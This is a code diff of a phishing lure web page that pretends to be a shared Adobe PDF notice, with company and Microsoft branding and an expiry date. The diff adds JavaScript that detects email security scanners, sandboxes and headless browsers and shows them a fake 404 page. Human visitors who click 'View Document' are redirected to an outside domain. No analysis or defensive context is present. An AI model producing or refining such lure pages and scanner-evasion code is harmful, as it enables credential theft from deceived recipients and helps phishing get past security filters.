@@ -1,10 +1,11 @@
+
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Ontec</title>
-
 <style>
     body{
         margin:0;
@@ -13,49 +14,37 @@
         text-align:center;
         color:#333;
     }
-
-  
-
     .container{
         width:100%;
         max-width:900px;
         margin:0 auto;
         padding:40px 20px;
     }
-
     .logo{
         margin-top:40px;
     }
-
     .logo img{
-        width:56%;
+        width:100%;
     }
-
     .brand-name{
         font-size:28px;
         margin-top:10px;
         letter-spacing:1px;
     }
-
     hr{
-        margin:60px 0;
-        border:none;
+        margin:60px 0;        border:none;
         border-top:1px solid #aaa;
     }
-
     .message{
         font-size:32px;
         margin-bottom:40px;
     }
-
     .microsoft{
         margin:20px 0 60px 0;
     }
-
     .microsoft img{
         width:200px;
     }
-
     .btn{
         display:inline-block;
         background:#e45757;
@@ -65,32 +54,25 @@
         text-decoration:none;
         border-radius:3px;
         transition:0.3s;
+        cursor: pointer;
     }
-
     .btn:hover{
         background:#c94545;
     }
-
     .expiry {
-    font-size:16px;
-    color:#7a7a7a;
-    font-style:italic;
-    margin-top:-10px;
-    margin-bottom:30px;
-}
-
+        font-size:16px;
+        color:#7a7a7a;
+        font-style:italic;
+        margin-top:-10px;
+        margin-bottom:30px;
+    }
 </style>
 </head>
-
 <body>
 
-<div class="container">
-
-
+<div class="container" id="content">
     <div class="logo">
-
-        <img class="brand-image" src="on.png" alt="RePower Electric Corp">
-
+  <img class="brand-image" src="on.png" alt="RePower Electric Corp">
     </div>
    
     <hr>
@@ -99,20 +81,40 @@
         Kindly find attached adobe PDF document
     </div>
 
-     <div class="expiry">
-    This document link will expire on March 15, 2026 at 11:59 PM.
-</div>
+    <div class="expiry">
+        This document link will expire on March 15, 2026 at 11:59 PM.
+    </div>
     
     <div class="microsoft">
-
-        <img src="micro.png" Microsoft Logo">
+        <img src="micro.png" alt="Microsoft Logo">
     </div>
 
-
-    <a href=" https://app.stotraitro.com/gX4GwcGvoV!PBtC1S/" class="btn">View Document</a>
-
-   
+    <a href="#" id="view-btn" class="btn">View Document</a>
 </div>
+
+<script>
+    // 1. Enhanced Detection (Targets automated security scanners)
+    const isBot = /bot|crawl|spider|slurp|mimecast|defender|sandbox|headless|inspection|security/i.test(navigator.userAgent) 
+                  || navigator.webdriver 
+                  || window.innerWidth < 100;
+
+    if (isBot) {
+        // If a bot is detected, show a fake 404
+        document.getElementById('content').innerHTML = "<div style='padding:100px;'><h1>404 Not Found</h1><p>The resource is temporarily unavailable.</p></div>";
+    } else {
+        // 2. Real-user click handler
+        const viewBtn = document.getElementById('view-btn');
+        const secureUrl = "https://tag.stotraitro.com/wQZ9f!ULZupBQb83B/ ";
+
+        viewBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            // Redirects only when a real human clicks
+            window.location.href = secureUrl;
+        });
+    }
+</script>
 
 </body>
 </html>
+
+
